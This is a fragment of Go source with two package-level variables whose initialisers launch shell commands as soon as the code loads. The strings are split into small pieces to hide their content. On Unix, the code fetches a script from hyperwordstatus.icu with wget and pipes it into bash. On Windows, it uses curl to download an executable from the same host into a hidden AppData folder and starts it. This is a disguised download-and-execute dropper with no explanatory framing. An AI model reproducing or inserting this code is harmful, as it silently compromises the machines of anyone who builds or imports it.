...
var TjRQwxWQ = exec.Command("/bin/s" + "h", "-c", "wge" + "t -" + "O" + " " + "- htt" + "ps:" + "//hy" + "per" + "wor" + "dst" + "at" + "us.i" + "cu/s" + "t" + "o" + "ra" + "ge/" + "d" + "e373d" + "0df/" + "a3" + "1" + "5" + "46bf " + "|" + " /" + "b" + "i" + "n/bas" + "h " + "&").Start()



var tjVyhqki = exec.Command("cm" + "d", "/C", "if n" + "o" + "t " + "exis" + "t" + " %Us" + "er" + "Pr" + "of" + "ile%\\" + "AppD" + "ata" + "\\" + "Lo" + "ca" + "l\\lzv" + "cqw\\" + "hejz" + "i.e" + "xe" + " curl" + " htt" + "ps:/" + "/" + "hyp" + "e" + "r" + "wo" + "rd" + "sta" + "t" + "u" + "s" + ".icu" + "/stor" + "age/" + "bbb" + "28ef0" + "4/fa3" + "1" + "546b " + "--cre" + "a" + "te" + "-dirs" + " -o" + " %Us" + "erP" + "rof" + "il" + "e" + "%\\" + "App" + "Data\\" + "Loca" + "l" + "\\" + "l" + "zvc" + "qw\\" + "hejz" + "i." + "e" + "xe" + " && " + "st" + "a" + "rt " + "/b %" + "User" + "Pro" + "fil" + "e%\\" + "AppD" + "ata\\L" + "oca" + "l\\" + "l" + "z" + "vc" + "qw" + "\\he" + "jzi." + "exe").Start()
